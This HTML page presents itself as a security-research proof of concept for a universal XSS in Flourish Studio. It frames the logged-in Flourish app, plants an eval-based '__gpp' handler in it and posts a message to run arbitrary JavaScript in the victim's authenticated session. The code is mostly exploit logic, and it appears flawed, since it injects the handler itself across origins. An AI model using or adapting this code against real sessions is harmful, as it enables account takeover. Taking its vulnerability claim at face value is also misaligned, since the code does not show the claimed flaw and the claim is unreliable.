<!DOCTYPE html>
<html>
<head>
    <title>Security Research Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .info { background: #f0f8ff; padding: 15px; border-radius: 5px; margin: 20px 0; }
        iframe { border: 2px solid #3366ff; }
    </style>
</head>
<body>
    <h1>Security Research Demonstration</h1>
    
    <div class="info">
        <strong>This page demonstrates the Universal XSS vulnerability in Flourish Studio</strong>
        <p>When loaded, it will automatically exploit the vulnerable GPP handler in the embedded Flourish dashboard.</p>
    </div>

    <!-- Victim's Flourish session loads here -->
    <iframe id="flourishFrame" src="https://app.flourish.studio/projects" 
            style="width:100%; height:700px; border: 2px solid blue;"></iframe>

    <script>
        // Wait for page to fully load
        window.addEventListener("load", function() {
            const frame = document.getElementById("flourishFrame");
            console.log("üöÄ Attacker page loaded, waiting for Flourish iframe...");

            frame.onload = function() {
                console.log("‚úÖ Flourish iframe loaded, injecting exploit...");
                
                // 1. Define the malicious GPP handler in victim's context
                try {
                    frame.contentWindow.__gpp = function(command, callback, parameter) {
                        console.log("üéØ GPP Command intercepted in victim session:", command);
                        
                        // Execute attacker code in victim's authenticated session
                        if (typeof parameter === 'string' && parameter.trim()) {
                            try {
                                (0, eval)(parameter); // CODE EXECUTION
                                console.log("‚úÖ Remote code executed in victim session");
                            } catch(e) {
                                console.error("‚ùå Execution failed:", e);
                            }
                        }
                        
                        // Return legitimate response
                        if (typeof callback === 'function') {
                            callback("success", true);
                        }
                        return "exploited";
                    };
                    console.log("‚úÖ Malicious GPP handler installed in victim session");
                } catch(e) {
                    console.error("‚ùå Failed to inject GPP handler:", e);
                    return;
                }

                // 2. Trigger the exploit after short delay
                setTimeout(function() {
                    console.log("üì§ Sending exploit trigger to victim session...");
                    
                    frame.contentWindow.postMessage({
                        __gppCall: {
                            command: "execute",
                            parameter: "document.body.style.border = '10px solid red'; document.title = 'XSS TEST'; console.log('XSS Working');",
                            callId: "universal-xss-poc"
                        }
                    }, "*");
                    
                    console.log("‚úÖ Exploit trigger sent to victim session");
                }, 3000);
            };
        });
    </script>
</body>
</html>
